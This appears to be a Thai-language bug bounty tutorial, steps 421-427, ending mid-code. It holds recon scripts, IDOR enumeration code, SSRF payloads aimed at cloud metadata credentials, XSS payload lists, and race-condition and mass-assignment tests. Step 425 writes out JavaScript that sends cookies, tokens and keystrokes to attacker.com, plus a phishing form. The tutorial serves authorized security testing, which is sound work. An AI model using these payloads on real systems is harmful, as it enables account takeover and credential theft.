# Part 43: Bug Bounty Methodology (Steps 421-430)

## ภาพรวม
กระบวนการและวิธีการทำ Bug Bounty อย่างมืออาชีพ ครอบคลุม reconnaissance, scope management, vulnerability prioritization, report writing, IDOR/SSRF/XSS/RCE discovery, automation tools, collaboration, และการเป็น top hunter

---

## Step 421: Bug Bounty Program Selection และ Scope Analysis

```python
from dataclasses import dataclass, field
from typing import List, Dict, Optional
import re
from enum import Enum

class SeverityLevel(Enum):
    CRITICAL = 'critical'
    HIGH = 'high'
    MEDIUM = 'medium'
    LOW = 'low'
    INFORMATIONAL = 'informational'

@dataclass
class BugBountyProgram:
    name: str
    platform: str  # HackerOne, Bugcrowd, Intigriti, etc.
    max_reward: float
    scope_domains: List[str]
    out_of_scope: List[str]
    vuln_types: List[str]
    response_efficiency: float  # 0-10 score
    competition_level: str  # low/medium/high
    private: bool

class ProgramSelector:
    """เลือกโปรแกรม bug bounty ที่เหมาะสม"""
    
    def score_program(self, program: BugBountyProgram,
                       hunter_skills: List[str]) -> Dict:
        """คำนวณคะแนนโปรแกรม"""
        score = 0
        reasons = []
        
        # Reward potential
        if program.max_reward >= 10000:
            score += 30
            reasons.append('High reward potential')
        elif program.max_reward >= 1000:
            score += 20
        else:
            score += 5
        
        # Competition level
        if program.competition_level == 'low':
            score += 25
            reasons.append('Low competition')
        elif program.competition_level == 'medium':
            score += 15
        
        # Private program
        if program.private:
            score += 20
            reasons.append('Private program (invitation only)')
        
        # Skills match
        skill_match = sum(1 for skill in hunter_skills 
                         if any(skill.lower() in vt.lower() for vt in program.vuln_types))
        score += skill_match * 5
        if skill_match > 3:
            reasons.append(f'Good skill match ({skill_match} overlap)')
        
        # Response efficiency
        if program.response_efficiency >= 8:
            score += 15
            reasons.append('Excellent response efficiency')
        elif program.response_efficiency >= 6:
            score += 10
        
        return {
            'program': program.name,
            'score': score,
            'reasons': reasons,
            'priority': 'HIGH' if score >= 70 else 'MEDIUM' if score >= 50 else 'LOW'
        }
    
    def analyze_scope(self, scope_domains: List[str]) -> Dict:
        """วิเคราะห์ scope ของโปรแกรม"""
        analysis = {
            'wildcard_domains': [],
            'specific_domains': [],
            'ip_ranges': [],
            'mobile_apps': [],
            'total_attack_surface': 0,
            'interesting_domains': []
        }
        
        for domain in scope_domains:
            if domain.startswith('*.'):
                analysis['wildcard_domains'].append(domain)
                analysis['total_attack_surface'] += 100
            elif '/' in domain and not domain.startswith('http'):
                analysis['ip_ranges'].append(domain)
                analysis['total_attack_surface'] += 50
            elif 'android' in domain.lower() or 'ios' in domain.lower() or 'app' in domain.lower():
                analysis['mobile_apps'].append(domain)
                analysis['total_attack_surface'] += 30
            else:
                analysis['specific_domains'].append(domain)
                analysis['total_attack_surface'] += 10
            
            # Flag interesting targets
            interesting_keywords = ['api', 'admin', 'dev', 'staging', 'internal',
                                   'corp', 'vpn', 'sso', 'auth', 'login', 'payment']
            for kw in interesting_keywords:
                if kw in domain.lower():
                    analysis['interesting_domains'].append(domain)
                    break
        
        return analysis
    
    def check_scope_clarity(self, scope_text: str) -> List[str]:
        """ตรวจสอบความชัดเจนของ scope"""
        ambiguities = []
        
        # Check for vague language
        vague_terms = [
            'all subdomains', 'entire platform', 'mobile applications',
            'all endpoints', 'cloud infrastructure'
        ]
        for term in vague_terms:
            if term.lower() in scope_text.lower():
                ambiguities.append(f'Vague scope: "{term}" - clarify with program')
        
        # Check for missing bug class definitions
        important_classes = ['XSS', 'SSRF', 'SQL injection', 'RCE', 'IDOR']
        for vuln in important_classes:
            if vuln.lower() not in scope_text.lower():
                ambiguities.append(f'Unclear if {vuln} is in scope - check with program')
        
        return ambiguities


# Bug Bounty Platforms
PLATFORM_GUIDE = '''
=== Bug Bounty Platforms ===

HackerOne (hackerone.com)
- Largest platform
- Bug Bounty + VDP programs
- Good for beginners
- Reputation system

Bugcrowd (bugcrowd.com)
- Crowdsourced security
- Managed and self-managed
- Good UI for reports

Intigriti (intigriti.com)
- European focus
- Good for EU researchers
- Fair triaging

YesWeHack (yeswehack.com)
- French platform
- European programs
- Good for EU GDPR scope

Synack (synack.com)
- Invite-only, vetted researchers
- Higher-quality programs
- Higher payouts

Self-hosted Programs
- Google: bughunters.google.com
- Microsoft: msrc.microsoft.com
- Apple: security.apple.com
- Meta: facebook.com/whitehat
- Tesla, Shopify, etc.
'''
```

---

## Step 422: Advanced Reconnaissance สำหรับ Bug Bounty

```python
import asyncio
import aiohttp
import json
import re
from typing import List, Dict, Set

class BugBountyRecon:
    """การทำ Recon สำหรับ Bug Bounty"""
    
    def __init__(self, target_domain: str):
        self.target = target_domain
        self.subdomains: Set[str] = set()
        self.endpoints: List[str] = []
        self.js_files: List[str] = []
        self.parameters: Set[str] = set()
    
    async def comprehensive_recon(self) -> Dict:
        """Comprehensive recon pipeline"""
        print(f"Starting recon for {self.target}")
        
        # Run all recon phases
        subdomains = await self.enumerate_subdomains()
        live_hosts = await self.check_live_hosts(list(subdomains))
        
        # Crawl and discover endpoints
        for host in live_hosts[:10]:  # Limit for demo
            endpoints = await self.crawl_endpoints(f'https://{host}')
            self.endpoints.extend(endpoints)
        
        # Extract JS files and secrets
        js_secrets = await self.analyze_js_files()
        
        return {
            'subdomains': len(subdomains),
            'live_hosts': live_hosts,
            'endpoints': len(self.endpoints),
            'js_secrets': js_secrets,
        }
    
    async def enumerate_subdomains(self) -> Set[str]:
        """Subdomain enumeration from multiple sources"""
        subdomains = set()
        
        # Certificate Transparency
        ct_subs = await self._crt_sh_enum()
        subdomains.update(ct_subs)
        
        # SecurityTrails API (if API key available)
        # st_subs = await self._securitytrails_enum()
        # subdomains.update(st_subs)
        
        print(f"Found {len(subdomains)} subdomains")
        return subdomains
    
    async def _crt_sh_enum(self) -> Set[str]:
        """Certificate Transparency via crt.sh"""
        subdomains = set()
        url = f'https://crt.sh/?q=%.{self.target}&output=json'
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
                    if resp.status == 200:
                        data = await resp.json(content_type=None)
                        for cert in data:
                            names = cert.get('name_value', '').split('\n')
                            for name in names:
                                clean = name.strip().lstrip('*.').lower()
                                if self.target in clean:
                                    subdomains.add(clean)
        except Exception as e:
            print(f"crt.sh error: {e}")
        
        return subdomains
    
    async def check_live_hosts(self, subdomains: List[str]) -> List[str]:
        """Check which subdomains are live"""
        live = []
        semaphore = asyncio.Semaphore(50)
        
        async def check_one(subdomain):
            async with semaphore:
                for scheme in ['https', 'http']:
                    url = f'{scheme}://{subdomain}'
                    try:
                        async with aiohttp.ClientSession() as session:
                            async with session.get(
                                url, 
                                timeout=aiohttp.ClientTimeout(total=5),
                                allow_redirects=True,
                                ssl=False
                            ) as resp:
                                if resp.status < 500:
                                    live.append(subdomain)
                                    return
                    except Exception:
                        pass
        
        await asyncio.gather(*[check_one(s) for s in subdomains])
        return live
    
    async def crawl_endpoints(self, base_url: str) -> List[str]:
        """Crawl website for endpoints"""
        endpoints = []
        
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(base_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.content_type == 'text/html':
                        html = await resp.text()
                        
                        # Extract links
                        links = re.findall(r'href=["\']([^"\']+)["\']', html)
                        endpoints.extend(links)
                        
                        # Extract JS files
                        js_links = re.findall(r'src=["\']([^"\']*.js)["\']', html)
                        self.js_files.extend(js_links)
                        
                        # Extract form action endpoints
                        forms = re.findall(r'action=["\']([^"\']+)["\']', html)
                        endpoints.extend(forms)
                        
                        # Extract API endpoints from href
                        api_patterns = re.findall(r'["\']/(api|v[0-9]+)/[^"\' ]+', html)
                        endpoints.extend([p for p in api_patterns])
            except Exception:
                pass
        
        return list(set(endpoints))
    
    async def analyze_js_files(self) -> Dict:
        """Find secrets and endpoints in JS files"""
        results = {'endpoints': [], 'potential_secrets': [], 'api_keys': []}
        
        # Patterns for secrets
        secret_patterns = [
            (r'(?:api[_-]?key|apikey)\s*[:=]\s*["\']([^"\' ]{20,})', 'API Key'),
            (r'(?:secret|token|password|passwd)\s*[:=]\s*["\']([^"\' ]{8,})', 'Secret/Token'),
            (r'AKIA[0-9A-Z]{16}', 'AWS Access Key'),
            (r'(?:github_token|ghp_)[a-zA-Z0-9]{36}', 'GitHub Token'),
            (r'Bearer\s+[a-zA-Z0-9._-]{40,}', 'Bearer Token'),
            (r'eyJ[a-zA-Z0-9._-]{40,}', 'JWT Token'),
        ]
        
        # API endpoint patterns
        endpoint_patterns = [
            r'["\']/(api|v[0-9]+)/[^"\' ]+',
            r'fetch\(["\']([^"\' ]+)["\']',
            r'axios\.(get|post|put|delete)\(["\']([^"\' ]+)["\']',
            r'\$.ajax\(\{url:\s*["\']([^"\' ]+)["\']',
        ]
        
        async with aiohttp.ClientSession() as session:
            for js_url in self.js_files[:20]:  # Limit
                try:
                    async with session.get(
                        js_url, timeout=aiohttp.ClientTimeout(total=10)
                    ) as resp:
                        content = await resp.text()
                        
                        for pattern, secret_type in secret_patterns:
                            matches = re.findall(pattern, content, re.IGNORECASE)
                            for match in matches:
                                results['potential_secrets'].append({
                                    'type': secret_type,
                                    'value': match[:20] + '...',
                                    'file': js_url
                                })
                        
                        for pattern in endpoint_patterns:
                            matches = re.findall(pattern, content)
                            results['endpoints'].extend(matches)
                except Exception:
                    pass
        
        return results


# Recon automation commands
RECON_COMMANDS = '''
#!/bin/bash
# Bug Bounty Recon Automation

DOMAIN="$1"
mkdir -p recon/$DOMAIN/{subdomains,urls,js,screenshots,vulns}

# 1. Subdomain Enumeration (Passive)
echo "[*] Passive subdomain enumeration..."
subfinder -d $DOMAIN -all -o recon/$DOMAIN/subdomains/subfinder.txt
amass enum -d $DOMAIN -passive -o recon/$DOMAIN/subdomains/amass.txt
assetfinder --subs-only $DOMAIN > recon/$DOMAIN/subdomains/assetfinder.txt

# 2. DNS Brute Force (Active)
echo "[*] DNS brute force..."
massdns -r /opt/resolvers.txt -t A -o S -w recon/$DOMAIN/subdomains/massdns.txt \
    /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

# Combine and deduplicate
cat recon/$DOMAIN/subdomains/*.txt | sort -u > recon/$DOMAIN/subdomains/all.txt
echo "Total subdomains: $(wc -l < recon/$DOMAIN/subdomains/all.txt)"

# 3. Live host check
echo "[*] Checking live hosts..."
httpx -l recon/$DOMAIN/subdomains/all.txt -o recon/$DOMAIN/subdomains/live.txt \
    -status-code -title -tech-detect -follow-redirects

# 4. Screenshot all live hosts
echo "[*] Taking screenshots..."
gowitness file -f recon/$DOMAIN/subdomains/live.txt -P recon/$DOMAIN/screenshots/

# 5. URL Discovery
echo "[*] URL discovery..."
gau $DOMAIN --o recon/$DOMAIN/urls/gau.txt 2>/dev/null
waybackurls $DOMAIN > recon/$DOMAIN/urls/wayback.txt 2>/dev/null
hakrawler -url https://$DOMAIN -depth 3 -subs > recon/$DOMAIN/urls/crawl.txt 2>/dev/null

# 6. JavaScript analysis
echo "[*] JS file analysis..."
cat recon/$DOMAIN/urls/gau.txt | grep '\.js$' | sort -u > recon/$DOMAIN/js/jsfiles.txt
curl -s recon/$DOMAIN/js/jsfiles.txt | linkfinder -i - -o cli > recon/$DOMAIN/js/endpoints.txt

# 7. Parameter discovery
echo "[*] Parameter discovery..."
arjun -i recon/$DOMAIN/subdomains/live.txt -oT recon/$DOMAIN/urls/params.txt

echo "Done! Check recon/$DOMAIN/ for results"
'''
```

---

## Step 423: IDOR (Insecure Direct Object Reference) Hunting

```python
import re
import itertools
from typing import List, Dict, Optional, Tuple
import hashlib
import base64
import json

class IDORHunter:
    """ค้นหา IDOR vulnerabilities"""
    
    def analyze_endpoints_for_idor(self, endpoints: List[str]) -> List[Dict]:
        """วิเคราะห์ endpoints หา IDOR patterns"""
        idor_candidates = []
        
        # IDOR patterns in URLs
        idor_patterns = [
            (r'/(user|account|profile|order|invoice|document|file|message|ticket)s?/(\d+)', 'numeric_id'),
            (r'/(user|account|profile)s?/([a-f0-9]{8,})', 'hash_id'),
            (r'\?(?:user_id|account_id|id|uid|order_id)=(\d+)', 'query_param_id'),
            (r'\?(?:user_id|account_id|id|uid)=([a-zA-Z0-9_-]{10,})', 'uuid_param'),
            (r'/api/v\d+/(users?|accounts?|orders?|payments?)/(\d+|[a-f0-9-]{36})', 'api_object_id'),
        ]
        
        for endpoint in endpoints:
            for pattern, idor_type in idor_patterns:
                match = re.search(pattern, endpoint, re.IGNORECASE)
                if match:
                    idor_candidates.append({
                        'url': endpoint,
                        'type': idor_type,
                        'identifier': match.group(2) if len(match.groups()) >= 2 else match.group(1),
                        'test_cases': self._generate_test_cases(match.group(0))
                    })
        
        return idor_candidates
    
    def _generate_test_cases(self, original_id: str) -> List[str]:
        """Generate ID values to test for IDOR"""
        test_ids = []
        
        # Numeric ID manipulation
        if original_id.isdigit():
            id_val = int(original_id)
            test_ids.extend([
                str(id_val - 1),
                str(id_val + 1),
                str(id_val * 2),
                '1', '0', '-1', '99999',
                str(id_val).replace(str(id_val)[0], '9', 1),  # Increment first digit
            ])
        
        # UUID format
        elif re.match(r'^[a-f0-9-]{36}$', original_id):
            test_ids.append('00000000-0000-0000-0000-000000000001')
            test_ids.append('ffffffff-ffff-ffff-ffff-ffffffffffff')
        
        return test_ids
    
    def decode_id(self, identifier: str) -> Dict:
        """Attempt to decode encoded identifiers"""
        results = {'original': identifier, 'decoded_forms': []}
        
        # Try Base64 decode
        try:
            decoded = base64.b64decode(identifier + '==').decode('utf-8')
            results['decoded_forms'].append({'type': 'base64', 'value': decoded})
        except Exception:
            pass
        
        # Try Base64url decode
        try:
            decoded = base64.urlsafe_b64decode(identifier + '==').decode('utf-8')
            results['decoded_forms'].append({'type': 'base64url', 'value': decoded})
        except Exception:
            pass
        
        # Try JSON decode if it looks JSON-ish
        try:
            decoded = json.loads(identifier)
            results['decoded_forms'].append({'type': 'json', 'value': str(decoded)})
        except Exception:
            pass
        
        # Try hex decode
        try:
            if len(identifier) % 2 == 0 and all(c in '0123456789abcdefABCDEF' for c in identifier):
                decoded = bytes.fromhex(identifier).decode('utf-8')
                results['decoded_forms'].append({'type': 'hex', 'value': decoded})
        except Exception:
            pass
        
        return results
    
    def test_idor_bulk(self, base_url: str, object_type: str,
                       id_range: Tuple[int, int], 
                       auth_headers: Dict) -> List[Dict]:
        """Test IDOR by enumerating object IDs"""
        findings = []
        import urllib.request
        
        for id_val in range(id_range[0], id_range[1]):
            url = f'{base_url}/{object_type}/{id_val}'
            
            try:
                req = urllib.request.Request(url)
                for key, value in auth_headers.items():
                    req.add_header(key, value)
                
                with urllib.request.urlopen(req, timeout=5) as resp:
                    if resp.status == 200:
                        data = resp.read()
                        findings.append({
                            'url': url,
                            'id': id_val,
                            'status': 200,
                            'size': len(data),
                            'accessible': True
                        })
                        print(f"ACCESSIBLE: {url} ({len(data)} bytes)")
            except Exception:
                pass
        
        return findings
    
    def idor_report_template(self, finding: Dict) -> str:
        """Generate IDOR bug report"""
        return f"""
## IDOR - Unauthorized Access to {finding.get('object_type', 'Resource')}

**Severity**: {finding.get('severity', 'High')}

### Summary
An Insecure Direct Object Reference vulnerability was found at `{finding.get('url')}` 
that allows any authenticated user to access resources belonging to other users.

### Steps to Reproduce
1. Create/Login as User A
2. Navigate to: `{finding.get('victim_url')}`
3. Note your object ID: `{finding.get('your_id')}`
4. Replace the ID with another user's ID: `{finding.get('target_id')}`
5. Observe: The server returns {finding.get('other_user_data_description', 'data belonging to User B')}

### Impact
- Unauthorized access to sensitive user data
- Potential for mass data enumeration
- {finding.get('additional_impact', 'Account takeover possible if auth tokens exposed')}

### Proof of Concept
```
GET {finding.get('poc_request', '/api/users/VICTIM_ID')} HTTP/1.1
Authorization: Bearer USER_A_TOKEN
```

### Remediation
1. Implement server-side authorization checks
2. Verify that the requesting user owns or has permission to access the requested object
3. Use indirect references (map session-specific IDs to real IDs)
4. Log and alert on unauthorized access attempts
"""
```

---

## Step 424: SSRF การค้นหาและ Exploitation

```python
import urllib.parse
import re
from typing import List, Dict, Optional

class SSRFHunter:
    """ค้นหาและใช้ประโยชน์ SSRF"""
    
    SSRF_PAYLOADS = [
        # Basic localhost
        'http://localhost', 'http://127.0.0.1', 'http://0.0.0.0',
        'http://[::1]', 'http://[::ffff:127.0.0.1]',
        
        # Cloud metadata
        'http://169.254.169.254',              # AWS/GCP/Azure metadata
        'http://169.254.169.254/latest/meta-data/',  # AWS specific
        'http://metadata.google.internal',     # GCP
        'http://169.254.169.254/metadata/v1/', # DigitalOcean
        'http://100.100.100.200',              # Alibaba Cloud
        
        # IP obfuscation
        'http://2130706433',          # 127.0.0.1 decimal
        'http://0x7f000001',          # 127.0.0.1 hex
        'http://0177.0.0.1',          # 127.0.0.1 octal
        'http://127.1',               # Short notation
        'http://0',                   # Resolves to 0.0.0.0
        
        # URL bypass techniques
        'http://attacker.com@127.0.0.1',  # @-based bypass
        'http://127.0.0.1:80@attacker.com',  # Port confusion
        'http://spoofed.burpcollaborator.net',  # DNS rebinding
        
        # Protocol abuse
        'file:///etc/passwd',
        'file:///c:/windows/win.ini',
        'dict://localhost:11211/stats',  # Memcached
        'gopher://localhost:6379/_INFO',  # Redis
        'gopher://localhost:5432/_',     # PostgreSQL
        'sftp://localhost:22',
        'ftp://localhost:21',
    ]
    
    SSRF_PARAMETERS = [
        'url', 'uri', 'path', 'src', 'source', 'href', 'action',
        'link', 'redirect', 'feed', 'host', 'target', 'dest',
        'destination', 'location', 'callback', 'next', 'continue',
        'return_url', 'page', 'file', 'document', 'load', 'fetch',
        'proxy', 'mirror', 'server', 'endpoint', 'service', 'domain'
    ]
    
    def find_ssrf_parameters(self, url: str, html_content: str) -> List[str]:
        """ค้นหา parameters ที่อาจเป็น SSRF"""
        ssrf_params = []
        
        # Check URL parameters
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        for param in params.keys():
            if param.lower() in self.SSRF_PARAMETERS:
                ssrf_params.append(f'URL parameter: {param}')
        
        # Check form parameters
        form_params = re.findall(r'name=["\']([^"\']+)["\']', html_content)
        for param in form_params:
            if param.lower() in self.SSRF_PARAMETERS:
                ssrf_params.append(f'Form parameter: {param}')
        
        # Check for fetch/XMLHttpRequest with URL-like parameters
        js_patterns = re.findall(r'(?:fetch|XMLHttpRequest|axios).*?["\']https?://', html_content)
        if js_patterns:
            ssrf_params.append('Dynamic URL construction in JavaScript')
        
        # Check for image/PDF/document import features
        features = re.findall(r'(?:import|export|preview|render|generate).*(?:url|link|href)', 
                             html_content, re.IGNORECASE)
        if features:
            ssrf_params.append('Document/image import features (common SSRF vectors)')
        
        return ssrf_params
    
    def exploit_aws_metadata(self, ssrf_url: str) -> List[str]:
        """Exploit AWS metadata via SSRF"""
        endpoints = [
            '/latest/meta-data/',
            '/latest/meta-data/iam/security-credentials/',
            '/latest/meta-data/iam/security-credentials/ROLE_NAME',
            '/latest/meta-data/instance-id',
            '/latest/meta-data/local-ipv4',
            '/latest/meta-data/public-ipv4',
            '/latest/meta-data/hostname',
            '/latest/user-data',
            '/latest/dynamic/instance-identity/document',
        ]
        
        payloads = []
        for endpoint in endpoints:
            payloads.append(f'{ssrf_url}?url=http://169.254.169.254{endpoint}')
        
        print("AWS metadata SSRF payloads:")
        for p in payloads[:5]:
            print(f"  {p}")
        
        return payloads
    
    def blind_ssrf_with_oob(self, target: str, collaborator: str) -> List[str]:
        """Blind SSRF with out-of-band interaction"""
        payloads = [
            f'http://{collaborator}',
            f'https://{collaborator}',
            f'//attacker.{collaborator}',
            f'http://169.254.169.254/latest/meta-data/?utm_source={collaborator}',
        ]
        
        print(f"Test SSRF using Burp Collaborator or interactsh:")
        print(f"interactsh-client -s https://interactsh.com")  # Setup OOB server
        print(f"Then use payload: http://UNIQUE_ID.{collaborator}")
        
        return payloads
    
    def ssrf_bypass_techniques(self) -> Dict:
        """SSRF filter bypass techniques"""
        return {
            'ip_obfuscation': [
                '127.0.0.1 -> 2130706433 (decimal)',
                '127.0.0.1 -> 0x7f000001 (hex)',
                '127.0.0.1 -> 0177.0.0.1 (octal)',
                '127.0.0.1 -> 127.1 (short)',
                '127.0.0.1 -> localhost',
                '127.0.0.1 -> [::1] (IPv6)',
                '127.0.0.1 -> [::ffff:127.0.0.1]',
            ],
            'url_parsing_tricks': [
                'http://127.0.0.1:80 (add port)',
                'http://evil.com#@127.0.0.1',
                'http://127.0.0.1%2F@evil.com (URL encoding)',
                'http://127.0.0.1/.evil.com',
            ],
            'redirect_abuse': [
                '301 redirect from allowed domain',
                'meta refresh redirect',
                'JS window.location redirect',
            ],
            'protocol_bypass': [
                'dict://', 'gopher://', 'sftp://', 'ldap://',
                'file://', 'jar://', 'netdoc://',
            ]
        }
```

---

## Step 425: XSS Hunting แบบ Advanced

```python
import re
import urllib.parse
from typing import List, Dict

class AdvancedXSSHunter:
    """Advanced XSS discovery and exploitation"""
    
    XSS_PAYLOADS = [
        # Basic probes
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        
        # Filter bypass
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<SCRIPT>alert(1)</SCRIPT>',
        '<img src=x onerror=alert`1`>',
        '<<script>alert(1)//</script>',
        '<svg onload=alert(1)>',
        '<svg/onload=alert(1)>',
        '<body onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '" autofocus onfocus=alert(1) "',
        "javascript:alert(1)",
        
        # WAF bypass
        '<img/src=x onerror=alert(1)>',
        '<img src=x onErrOr=alert(1)>',
        '%3Cscript%3Ealert(1)%3C/script%3E',  # URL encoded
        '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',  # HTML entities
        '<svg><script>alert&#40;1&#41;</script>',
        
        # DOM XSS
        '#<script>alert(1)</script>',
        '#"><img src=x onerror=alert(1)>',
        "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
        
        # Polyglot XSS
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
    ]
    
    def find_reflection_points(self, url: str, response: str, 
                                param: str, value: str) -> List[str]:
        """Find where input is reflected in response"""
        reflections = []
        
        # Direct reflection
        if value in response:
            # Check context
            idx = response.find(value)
            context_before = response[max(0, idx-100):idx]
            context_after = response[idx+len(value):idx+len(value)+100]
            
            # HTML context
            if re.search(r'<[^>]*$', context_before):
                reflections.append({'type': 'html_attribute', 'position': idx})
            elif '<script' in context_before and '</script>' not in context_before:
                reflections.append({'type': 'javascript_string', 'position': idx})
            else:
                reflections.append({'type': 'html_body', 'position': idx})
        
        # URL-decoded reflection
        decoded_value = urllib.parse.unquote(value)
        if decoded_value != value and decoded_value in response:
            reflections.append({'type': 'url_decoded', 'position': response.find(decoded_value)})
        
        # HTML-encoded reflection
        html_encoded = value.replace('<', '&lt;').replace('>', '&gt;')
        if html_encoded in response:
            reflections.append({'type': 'html_encoded', 'position': response.find(html_encoded)})
        
        return reflections
    
    def generate_context_payloads(self, context: str) -> List[str]:
        """Generate XSS payloads based on injection context"""
        payloads = {
            'html_body': [
                '<img src=x onerror=alert(document.domain)>',
                '<svg onload=alert(document.domain)>',
                '<script>alert(document.domain)</script>',
            ],
            'html_attribute': [
                '" onmouseover="alert(document.domain)',
                '\' onfocus=\'alert(document.domain)\' autofocus=\'',
                '" autofocus onfocus="alert(document.domain)',
            ],
            'javascript_string': [
                "';alert(document.domain);//",
                "\\';alert(document.domain);//",
                '</script><script>alert(document.domain)</script>',
            ],
            'url': [
                'javascript:alert(document.domain)',
                'data:text/html,<script>alert(document.domain)</script>',
            ]
        }
        return payloads.get(context, payloads['html_body'])
    
    def dom_xss_sources_sinks(self) -> Dict:
        """DOM XSS sources and sinks reference"""
        return {
            'sources': [
                'document.URL', 'document.documentURI', 'location.href',
                'location.search', 'location.hash', 'location.pathname',
                'document.referrer', 'window.name', 'history.pushState',
                'localStorage', 'sessionStorage', 'document.cookie',
                'postMessage data', 'URL hash (#)',
            ],
            'sinks': [
                'document.write()', 'document.writeln()',
                'innerHTML', 'outerHTML',
                'insertAdjacentHTML()', 
                'eval()', 'setTimeout(str)', 'setInterval(str)',
                'location', 'location.href', 'location.replace()',
                'document.execCommand()',
                'jQuery.html()', '$(selector).html()',
                'AngularJS: ng-bind-html, ng-include',
                'React: dangerouslySetInnerHTML',
                'Vue: v-html',
            ]
        }
    
    def xss_to_account_takeover(self, xss_payload_location: str) -> str:
        """XSS escalation to account takeover"""
        return f"""
// XSS at: {xss_payload_location}

// Method 1: Steal session cookie
fetch('https://attacker.com/steal?c='+document.cookie)

// Method 2: Steal localStorage token
fetch('https://attacker.com/steal?token='+localStorage.getItem('jwt'))

// Method 3: CSRF via XSS (change email)
fetch('/api/user/email', {{method:'POST', headers:{{'Content-Type':'application/json',
    'X-CSRF-Token':document.cookie.match(/csrf=(\\w+)/)?.[1]}},
    body:JSON.stringify({{email:'attacker@evil.com'}})}}
)

// Method 4: Keylogger
document.addEventListener('keydown', e => 
    fetch('https://attacker.com/key?k='+e.key)
)

// Method 5: Phishing overlay
document.body.innerHTML = `<div style='position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999'>
    <form action='https://attacker.com/creds' method='POST'>
        <h2>Session expired, please login again</h2>
        Username: <input name='u'><br>
        Password: <input type='password' name='p'><br>
        <button>Login</button>
    </form></div>`
"""
```

---

## Step 426: Business Logic และ Privilege Escalation Bugs

```python
from typing import Dict, List

class BusinessLogicTesting:
    """ทดสอบ Business Logic vulnerabilities"""
    
    def race_condition_test(self, endpoint: str, concurrent_requests: int) -> str:
        """Race condition testing guide"""
        return f"""
# Race Condition Testing at: {endpoint}

# Method 1: Burp Suite Turbo Intruder (recommended)
# Send to Turbo Intruder, use race condition script:

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections={concurrent_requests},
                          requestsPerConnection=1,
                          pipeline=False)
    for i in range({concurrent_requests}):
        engine.queue(target.req, str(i))

def handleResponse(req, interesting):
    if '200' in req.response or 'success' in req.response.lower():
        table.add(req)

# Method 2: Python with threading
import threading, requests

def make_request():
    resp = requests.post('{endpoint}', 
        headers={{'Authorization': 'Bearer TOKEN'}},
        json={{'coupon': 'DISCOUNT50', 'amount': 100}})
    print(resp.status_code, resp.json())

threads = [threading.Thread(target=make_request) for _ in range({concurrent_requests})]
for t in threads:
    t.start()
for t in threads:
    t.join()

# Common race condition targets:
# - Coupon/discount code application
# - Gift card redemption
# - Balance transfer
# - Free trial signup
# - Resource limit bypass
"""
    
    def test_mass_assignment(self) -> Dict:
        """Mass assignment vulnerability testing"""
        return {
            'description': 'Mass assignment allows setting privileged fields',
            'test_payloads': [
                # Add admin role
                {'role': 'admin', 'is_admin': True, 'admin': 1},
                # Modify price
                {'price': 0.01, 'discount': 100},
                # Bypass payment
                {'paid': True, 'payment_status': 'completed'},
                # Elevate plan
                {'plan': 'enterprise', 'subscription': 'premium'},
            ],
            'how_to_test': [
                '1. Normal registration: POST /api/register {name, email, password}',
                '2. Add extra fields: POST /api/register {name, email, password, role: admin}',
                '3. Check if extra fields were applied',
                '4. Try object properties visible in GET response as POST params',
            ]
        }
    
    def test_price_manipulation(self) -> List[Dict]:
        """E-commerce price manipulation tests"""
        return [
            {'test': 'Negative quantity', 
             'payload': {'quantity': -1, 'price': 100}},
            {'test': 'Decimal overflow', 
             'payload': {'quantity': 9999999999}},
            {'test': 'Price as string', 
             'payload': {'price': '0.001'}},
            {'test': 'Missing price field',
             'payload': {}},  # Remove price from request
            {'test': 'Modify intercepted POST',
             'payload': {'price': 0.01}},  # Change in Burp
            {'test': 'Currency mismatch',
             'payload': {'price': 1, 'currency': 'IDR'}},  # Pay in low-value currency
        ]
    
    def test_account_takeover_flow(self) -> Dict:
        """Account takeover test cases"""
        return {
            'password_reset_flaws': [
                'Predictable reset token (timestamp-based)',
                'Reset token not invalidated after use',
                'Reset token valid forever',
                'Host header injection in reset email link',
                'Token reuse for different user',
                'No rate limiting on reset attempts',
            ],
            'oauth_flaws': [
                'state parameter not validated (CSRF)',
                'redirect_uri not restricted',
                'code reuse after exchange',
                'access_token in URL (logs)',
                'Account linking without email verification',
            ],
            '2fa_bypass': [
                'Rate limit bypass with IP rotation',
                'TOTP code reuse',
                'Backup code brute force',
                'API endpoint bypasses 2FA requirement',
                'Remember device token reuse',
            ]
        }
```

---

## Step 427: API Security Testing

```python
import json
import urllib.request
from typing import Dict, List, Optional

class APISecurityTester:
    """ทดสอบ API security สำหรับ Bug Bounty"""
    
    OWASP_API_TOP10 = {
        'API1': 'Broken Object Level Authorization (IDOR)',
        'API2': 'Broken User Authentication',
        'API3': 'Broken Object Property Level Authorization (Mass Assignment)',
        'API4': 'Unrestricted Resource Consumption',
        'API5': 'Broken Function Level Authorization',
        'API6': 'Unrestricted Access to Sensitive Business Flows',
        'API7': 'Server Side Request Forgery (SSRF)',
        'API8': 'Security Misconfiguration',
        'API9': 'Improper Inventory Management',
        'API10': 'Unsafe Consumption of APIs'
    }
    
    def discover_api_endpoints(self, base_url: str) -> List[str]:
        """ค้นหา API endpoints"""
        endpoints = []
        
        # Common API paths
        common_paths = [
            '/api', '/api/v1', '/api/v2', '/api/v3',
            '/v1', '/v2', '/graphql', '/graphiql',
            '/swagger.json', '/swagger-ui.html',
            '/openapi.json', '/openapi.yaml',
            '/api-docs', '/api/docs',
